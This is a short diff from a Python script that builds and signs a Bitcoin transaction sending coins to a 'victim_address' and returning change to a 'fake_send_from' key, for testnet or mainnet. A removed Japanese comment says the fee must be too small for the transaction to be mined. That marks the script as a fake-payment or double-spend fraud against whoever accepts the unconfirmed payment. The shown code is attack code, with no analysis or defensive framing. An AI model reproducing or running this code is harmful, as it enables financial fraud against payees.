@@ -85,16 +85,14 @@ if balance < send_amount:
     print(f"[!] insufficient funds. ")
     exit()
 
-fee = 0 # ここはマインングできないくらい著しく小さな値にすることが重要。
 
 change_btc_amt = (balance - send_amount) #おつり
-
 if testnet:
     tx_victim = [{"address": victim_address, "value": send_amount}, {"address": transaction_util.wiftoaddr(fake_send_from), "value": change_btc_amt}]
 else:
     tx_victim = [{"address": victim_address, "value": send_amount}, {"address": transaction_util.wiftoaddr(fake_send_from), "value": change_btc_amt}]
 
-tx_victim = transaction_util.mktx_with_change(inputs, tx_victim, fee=fee)
+tx_victim = transaction_util.mktx(inputs, tx_victim)
 if testnet:
     tx_victim = cryptos.serialize(transaction_util.sign(tx_victim, 0, fake_send_from))
 else:
